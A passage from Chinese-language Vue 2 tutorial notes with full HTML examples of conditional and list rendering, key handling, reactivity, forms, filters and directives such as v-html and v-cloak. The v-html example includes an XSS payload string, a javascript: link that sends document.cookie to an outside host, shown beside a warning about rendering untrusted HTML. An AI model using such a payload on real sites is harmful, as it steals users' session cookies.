                name:'尚硅谷',
                mood: 'normal',
                classArr: ['atguigu1','atguigu2','atguigu3'],
                classObj:{
                    atguigu1: false,
                    atguigu2: false
                },
                styleObj:{
                    fontSize: '40px',
                    color: 'red',
                },
                styleObj2:{
                    backgroundColor: 'orange'
                },
                styleArr:[
                    {
                        fontSize: '40px',
                        color: 'red',
                    },
                    {
                        backgroundColor: 'orange'
                    }
                ]
            },
            methods: {
                changeMood(){
                    const arr = ['happy','normal','sad'];
                    const num = Math.floor(Math.random()*3)

                    this.mood = arr[num];
                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220220122712562](vue_basic.assets/image-20220220122712562.png)

# 条件渲染

**条件渲染指令**

1. v-if 与 v-else 
2. v-show

**比较 v-if 与 v-show**

1. 如果需要频繁切换 v-show 较好 

2. 当条件不成立时, v-if 的所有子节点不会解析(项目中使用)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>
    <!-- 
        条件渲染：
                    1.v-if
                                写法：
                                        (1).v-if="表达式" 
                                        (2).v-else-if="表达式"
                                        (3).v-else="表达式"
                                适用于：切换频率较低的场景。
                                特点：不展示的DOM元素直接被移除。
                                注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

                    2.v-show
                                写法：v-show="表达式"
                                适用于：切换频率较高的场景。
                                特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
                        
                    3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>当前的n值是：{{n}}</h2>
        <button @click="n++">点我n+1</button>
        <!-- 使用v-show进行条件渲染 -->
        <!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
        <!-- <h2 v-show="1===1">欢迎来到{{name}}</h2> -->

        <!-- 使用v-if做条件渲染 -->
        <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
        <!-- <h2 v-if="1===1">欢迎来到{{name}}</h2> -->

        <!-- v-else和v-else-if -->
        <!-- <div v-if="n===1">Angular</div>
        <div v-else-if="n===2">React</div>
        <div v-else-if="n===3">Vue</div>
        <div v-else>哈哈</div> -->
        
        <!-- v-if与template配合使用 -->
        <template v-if="n===1">
            <h2>你好</h2>
            <h2>尚硅谷</h2>
            <h2>北京</h2>
        </template>

    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                name: '尚硅谷',
                n: 0
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220122817942](vue_basic.assets/image-20220220122817942.png)

# 列表渲染

## 1_基本列表

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>
    <!-- 
        v-for指令:
                1.用于展示列表数据
                2.语法：v-for="(item, index) in xxx" :key="yyy"
                3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 遍历数组 -->
        <h2>人员列表</h2>
        <ul>
            <li v-for="(p,index) in persons" :key="index">{{index}}-{{p.name}}-{{p.age}}</li>
        </ul>

        <!-- 遍历对象 -->
        <h2>汽车信息</h2>
        <ul>
            <li v-for="(value,key) in car">
                {{value}}---{{key}}
            </li>
        </ul>

        <!-- 遍历字符串 -->
        <h2>测试遍历字符串（用得少）</h2>
        <ul>
            <li v-for="(char,index) in str" :key="index">
                {{char}}---{{index}}
            </li>
        </ul>

        <!-- 遍历指定次数 -->
        <h2>测试遍历指定次数（用得少）</h2>
        <ul>
            <li v-for="(num,index) in 5">
                {{num}}---{{index}}
            </li>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                persons: [
                    {id: '001', name: '张三', age: 18},
                    {id: '002', name: '李四', age: 19},
                    {id: '003', name: '王五', age: 20},
                ],
                car:{
                    name: '奥迪a8',
                    price: '70万',
                    color: '黑色'
                },
                str: 'hello'
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220122915418](vue_basic.assets/image-20220220122915418.png)

## 2_key的原理

![Snipaste_2022-02-06_14-11-48](vue_basic.assets/Snipaste_2022-02-06_14-11-48.png)

![Snipaste_2022-02-06_14-44-21](vue_basic.assets/Snipaste_2022-02-06_14-44-21.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>
<!-- 
    面试题：react、vue中的key有什么作用？（key的内部原理）
            
            1. 虚拟DOM中key的作用：
                            key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
                            随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
                            
            2.对比规则：
                        (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
                                    ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
                                    ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

                        (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
                                    创建新的真实DOM，随后渲染到到页面。
                                    
            3. 用index作为key可能会引发的问题：
                                1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
                                                会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

                                2. 如果结构中还包含输入类的DOM：
                                                会产生错误DOM更新 ==> 界面有问题。

            4. 开发中如何选择key?:
                                1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
                                2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
                                    使用index作为key是没有问题的。
-->

    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 遍历数组 -->
        <h2>人员列表</h2>
        <button @click.once="add">添加一个老刘</button>
        <ul>
            <li v-for="(p,index) in persons" :key="index">
                {{index}}-{{p.name}}-{{p.age}}
                <input type="text">
            </li>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                persons: [
                    {id: '001', name: '张三', age: 18},
                    {id: '002', name: '李四', age: 19},
                    {id: '003', name: '王五', age: 20},
                ]
            },
            methods: {
                add(){
                    const p = {id:'004',name:'老刘',age:40};

                    this.persons.unshift(p);
                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220220133501027](vue_basic.assets/image-20220220133501027.png)

## 3_列表过滤

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 准备好一个容器 -->
    <div id="root">

        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p,index) in filPersons" :key="index">{{index}}-{{p.name}}-{{p.age}}</li>
        </ul>
        
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示


        // 用watch实现
        //#region
        // new Vue({
        //     el:'#root',
        //     data:{
        //         keyWord: '',
        //         persons: [
        //             {id: '001', name: '马冬梅', age: 18,sex:'女'},
        //             {id: '002', name: '周冬雨', age: 19,sex:'女'},
        //             {id: '003', name: '周杰伦', age: 20,sex:'男'},
        //             {id: '003', name: '温兆伦', age: 20,sex:'男'},
        //         ],
        //         filPersons:[]
        //     },
        //     watch:{
        //         keyWord:{
        //             immediate:true,
        //             handler(val){
        //                 this.filPersons = this.persons.filter((p)=>{
        //                 return p.name.indexOf(val) != -1;
        //                 })
        //             }
        //         },
        //     }
        // })
        //#endregion

        //用computed实现
        new Vue({
            el:'#root',
            data:{
                keyWord: '',
                persons: [
                    {id: '001', name: '马冬梅', age: 18,sex:'女'},
                    {id: '002', name: '周冬雨', age: 19,sex:'女'},
                    {id: '003', name: '周杰伦', age: 20,sex:'男'},
                    {id: '003', name: '温兆伦', age: 20,sex:'男'},
                ],
            },
            computed:{
                filPersons(){
                    return this.persons.filter((p)=>{
                        return p.name.indexOf(this.keyWord) !== -1;
                    })
                }
            }
        })


    </script>


    
</body>
</html>
```

![image-20220220133548231](vue_basic.assets/image-20220220133548231.png)

## 4_列表排序

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 准备好一个容器 -->
    <div id="root">

        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <button @click="sortType = 2">年龄升序</button>
        <button @click="sortType = 1">年龄降序</button>
        <button @click="sortType = 0">原顺序</button>
        <ul>
            <li v-for="(p,index) in filPersons" :key="index">{{index}}-{{p.name}}-{{p.age}}</li>
        </ul>
        
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //用computed实现
        new Vue({
            el:'#root',
            data:{
                keyWord: '',
                sortType: 0,//0原顺序 1降序 2升序
                persons: [
                    {id: '001', name: '马冬梅', age: 18,sex:'女'},
                    {id: '002', name: '周冬雨', age: 20,sex:'女'},
                    {id: '003', name: '周杰伦', age: 23,sex:'男'},
                    {id: '004', name: '温兆伦', age: 21,sex:'男'},
                ],
            },
            computed:{
                filPersons(){
                    return this.persons.filter((p)=>{
                        return p.name.indexOf(this.keyWord) !== -1;
                    }).sort((a,b)=>{
                        if(this.sortType === 0){
                            return;
                        }else if(this.sortType === 2){
                            return a.age - b.age;
                        }else if(this.sortType === 1){
                            return b.age - a.age;
                        }
                    })
                }
            }
        })


    </script>


    
</body>
</html>
```

![image-20220220133629264](vue_basic.assets/image-20220220133629264.png)

## 5_更新时的一个问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 准备好一个容器 -->
    <div id="root">

        <h2>人员列表</h2>
        <button @click="updateMei">更新马冬梅信息</button>
        <ul>
            <li v-for="(p,index) in persons" :key="p.id">{{p.name}}-{{p.age}}-{{p.sex}}</li>
        </ul>
        
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //用computed实现
        const vm = new Vue({
            el:'#root',
            data:{
                persons: [
                    {id: '001', name: '马冬梅', age: 18,sex:'女'},
                    {id: '002', name: '周冬雨', age: 20,sex:'女'},
                    {id: '003', name: '周杰伦', age: 23,sex:'男'},
                    {id: '004', name: '温兆伦', age: 21,sex:'男'},
                ],
            },
            methods: {
                updateMei(){
                    //奏效
                    // this.persons[0].name = '马老师';
                    // this.persons[0].age = 50;
                    // this.persons[0].sex = '男'
                    // this.persons[0] = {id: '001', name: '马老师', age: 50,sex:'男'};//不奏效
                    this.persons.splice(0,1,{id: '001', name: '马老师', age: 50,sex:'男'});
                }
            },
        })


    </script>


    
</body>
</html>
```

## 6_vue监测数据改变的原理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                name: '尚硅谷',
                address: '北京'
            }
        })
    </script>


    
</body>
</html>
```

## 7.模拟一个数据监测

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <script>
        let data = {
            name: '尚硅谷',
            address: '北京'
        }


        //创建一个监视的实例对象，用于监视data中属性的变化
        const obs = new Observer(data);
        console.log(obs);

        //准备一个vm实例对象
        let vm = {};
        vm._data = obs;

        function Observer(obj){
            //汇总对象中所有的属性形成一个数组
            const keys = Object.keys(obj);
            //遍历
            keys.forEach((k)=>{
                Object.defineProperty(this,k,{
                    get(){
                        return obj[k];
                    },
                    set(val){
                        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM...我要开始忙了`);
                        obj[k] = val;
                    }
                })
            })
        }

    </script>
    
</body>
</html>
```

![image-20220220134025357](vue_basic.assets/image-20220220134025357.png)

## 8_vue.set的使用

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>学校名称：{{shool.name}}</h2>
        <h2>学校地址：{{shool.address}}</h2>
        <h2>校长：{{shool.leader}}</h2>
        <hr>
        <h1>学生信息</h1>
        <button @click="addSex">添加一个性别属性，默认值为男</button>
        <h2>姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>年龄：真实: {{student.age.rAge}}, 对外: {{student.age.sAge}}</h2>
        <h2>朋友们</h2>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}----{{f.age}}
            </li>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                shool:{
                    name: '尚硅谷',
                    address: '北京',
                },
                student:{
                    name: 'tom',
                    age:{
                        rAge: 40,
                        sAge: 29,
                    },
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36},
                    ]
                }
            },
            methods: {
                addSex(){
                    // Vue.set(this.student, 'sex', '男');
                    this.$set(this.student, 'sex', '男');
                    
                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220220134120862](vue_basic.assets/image-20220220134120862.png)

## 9_vue监测数据改变的原理 数组

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>学校名称：{{shool.name}}</h2>
        <h2>学校地址：{{shool.address}}</h2>
        <h2>校长：{{shool.leader}}</h2>
        <hr>
        <h1>学生信息</h1>
        <button @click="addSex">添加一个性别属性，默认值为男</button>
        <h2>姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>年龄：真实: {{student.age.rAge}}, 对外: {{student.age.sAge}}</h2>
        <h2>朋友们</h2>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}----{{f.age}}
            </li>
        </ul>
        <h2>爱好</h2>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                shool:{
                    name: '尚硅谷',
                    address: '北京',
                },
                student:{
                    name: 'tom',
                    age:{
                        rAge: 40,
                        sAge: 29,
                    },
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36},
                    ],
                    hobby:['抽烟','喝酒','烫头']
                }
            },
            methods: {
                addSex(){
                    // Vue.set(this.student, 'sex', '男');
                    this.$set(this.student, 'sex', '男');
                    
                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220220134224070](vue_basic.assets/image-20220220134224070.png)

## 10_总结vue数据监测

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>
    <!--
        Vue监视数据的原理：
            1. vue会监视data中所有层次的数据。

            2. 如何监测对象中的数据？
                            通过setter实现监视，且要在new Vue时就传入要监测的数据。
                                (1).对象中后追加的属性，Vue默认不做响应式处理
                                (2).如需给后添加的属性做响应式，请使用如下API：
                                                Vue.set(target，propertyName/index，value) 或 
                                                vm.$set(target，propertyName/index，value)

            3. 如何监测数组中的数据？
                                通过包裹数组更新元素的方法实现，本质就是做了两件事：
                                    (1).调用原生对应的方法对数组进行更新。
                                    (2).重新解析模板，进而更新页面。

            4.在Vue修改数组中的某个元素一定要用如下方法：
                        1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
                        2.Vue.set() 或 vm.$set()
            
            特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
		-->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>学生信息</h1>

        <button @click="student.age++">年龄+1</button> <br>
        <button @click="addSex">添加性别属性，默认值：男</button> <br>
        <button @click="student.sex = '未知'">修改性别</button> <br>
        <button @click="addFriend">在列表首位添加一个朋友</button> <br>
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br>
        <button @click="addHobby">添加一个爱好</button> <br>
        <button @click="updateFirstHobby">修改第一个爱好为开车</button> <br>
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button>

        <h2>姓名：{{student.name}}</h2>
        <h2>年龄：{{student.age}}</h2>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>朋友们</h2>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}----{{f.age}}
            </li>
        </ul>
        <h2>爱好</h2>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el:'#root',
            data:{
                shool:{
                    name: '尚硅谷',
                    address: '北京',
                },
                student:{
                    name: 'tom',
                    age:18,
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36},
                    ],
                    hobby:['抽烟','喝酒','烫头']
                }
            },
            methods: {
                addSex(){
                    // Vue.set(this.student, 'sex', '男');
                    this.$set(this.student, 'sex', '男');
                    
                },
                addFriend(){
                    this.student.friends.unshift({name:'jack',age:40});
                },
                updateFirstFriendName(){
                    this.student.friends[0].name = 'zhangsan';
                },
                addHobby(){
                    this.student.hobby.push('学习');
                },
                updateFirstHobby(){
                    // this.student.hobby.splice(0,1,'开车');
                    // Vue.set(this.student.hobby,0,'开车');
                    this.$set(this.student.hobby,0,'开车');
                },
                removeSmoke(){
                    this.student.hobby = this.student.hobby.filter((h)=>{
                        return h !== '抽烟';
                    })
                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220220134258115](vue_basic.assets/image-20220220134258115.png)

# 收集表单数据

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    收集表单数据：
            若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
            若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
            若：<input type="checkbox"/>
                    1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                    2.配置input的value属性:
                            (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                            (2)v-model的初始值是数组，那么收集的的就是value组成的数组
            备注：v-model的三个修饰符：
                            lazy：失去焦点再收集数据
                            number：输入字符串转为有效的数字
                            trim：输入首尾空格过滤
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="account"> <br> <br>
            密码：<input type="password" v-model="password"> <br> <br>
            年龄：<input type="number" v-model.number="age"> <br> <br>
            性别：
            男<input type="radio" name="sex" v-model="sex" value="male">
            女<input type="radio" name="sex" v-model="sex" value="female"> <br> <br>
            爱好：
            学习 <input type="checkbox" name="hobby" value="study" v-model="hobby">
            打游戏<input type="checkbox" name="hobby" value="game" v-model="hobby">
            吃饭<input type="checkbox" name="hobby" value="eat" v-model="hobby">
            <br><br>
            <select v-model="shool">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select>
            <br><br>
            其他信息：<textarea v-model.lazy="msg"></textarea> <br>
            <input type="checkbox" v-model="accept">阅读并接受<a href="#">《用户协议》</a> <br>
            <button>提交</button>
        </form>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                account:'',
                password:'',
                sex:'female',
                hobby:[],
                shool:'',
                msg:'',
                accept:'',
                age:''
            },
            methods: {
                demo(){

                }
            },
        })
    </script>


    
</body>
</html>
```

![image-20220220134429209](vue_basic.assets/image-20220220134429209.png)

# 过滤器

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <script type='text/javascript' src="../js/dayjs.min.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
        过滤器：
            定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
            语法：
                    1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
                    2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
            备注：
                    1.过滤器也可以接收额外参数、多个过滤器也可以串联
                    2.并没有改变原本的数据, 是产生新的对应的数据
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>显示格式化后的时间</h2>
        <!-- 计算属性实现 -->
        <h3>现在是：{{fmtTime}}</h3>
        <!-- methods实现 -->
        <h3>现在是：{{getFmtTime()}}</h3>
        <!-- 过滤器实现 -->
        <h3>现在是：{{time | timeFormatter}}</h3>
        <!-- 过滤器传参 -->
        <h3>现在是：{{time | timeFormatter('YYYY_MM_DD') | mySlice}}</h3>
        <!-- 很少用 -->
        <h3 :x="msg | mySlice">尚硅谷</h3>



    </div>

    <div id="root2">
        <h2>{{msg | mySlice}}</h2>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示
        //全局过滤器
        Vue.filter('mySlice',function(value){
            return value.slice(0,4);
        })

        new Vue({
            el:'#root',
            data:{
                time:1644914856847,//时间戳
                msg: '你好，Vue'
            },
            computed:{
                fmtTime(){
                    return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss');
                }
            },
            methods: {
                getFmtTime(){
                    return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss');
                }
            },
            filters:{
                timeFormatter(value,str='YYYY年MM月DD日 HH:mm:ss'){
                    return dayjs(value).format(str);
                }
            }
        })

        new Vue({
            el:'#root2',
            data:{
                msg: 'hello vue'
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220134701555](vue_basic.assets/image-20220220134701555.png)

# 内置指令

## 1_v-text指令

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>
    <!-- 
        我们学过的指令：
                v-bind	: 单向绑定解析表达式, 可简写为 :xxx
                v-model	: 双向数据绑定
                v-for  	: 遍历数组/对象/字符串
                v-on   	: 绑定事件监听, 可简写为@
                v-if 	 	: 条件渲染（动态控制节点是否存在）
                v-else 	: 条件渲染（动态控制节点是否存在）
                v-show 	: 条件渲染 (动态控制节点是否展示)
        v-text指令：
                1.作用：向其所在的节点中渲染文本内容。
                2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                name: '尚硅谷',
                str: '<h3>你好啊！</h3>'
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220134729072](vue_basic.assets/image-20220220134729072.png)

## 2_v-html指令

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
        v-html指令：
                1.作用：向指定节点中渲染包含html结构的内容。
                2.与插值语法的区别：
                            (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                            (2).v-html可以识别html结构。
                3.严重注意：v-html有安全性问题！！！！
                            (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                            (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <div>你好,{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
        
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                name: '尚硅谷',
                str: '<h3>你好啊！</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，点这里</a>'
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220134804902](vue_basic.assets/image-20220220134804902.png)

## 3_v-cloak指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 
				v-cloak指令（没有值）：
						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

## 5_v-once指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-once指令：
						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

![image-20220220134931375](vue_basic.assets/image-20220220134931375.png)

## 5.v-pre_指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-pre指令：
					1.跳过其所在节点的编译过程。
					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

![image-20220220135005974](vue_basic.assets/image-20220220135005974.png)

# 自定义命令

## 回顾一个DOM操作

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
		<style>
			.demo{
				background-color: orange;
			}
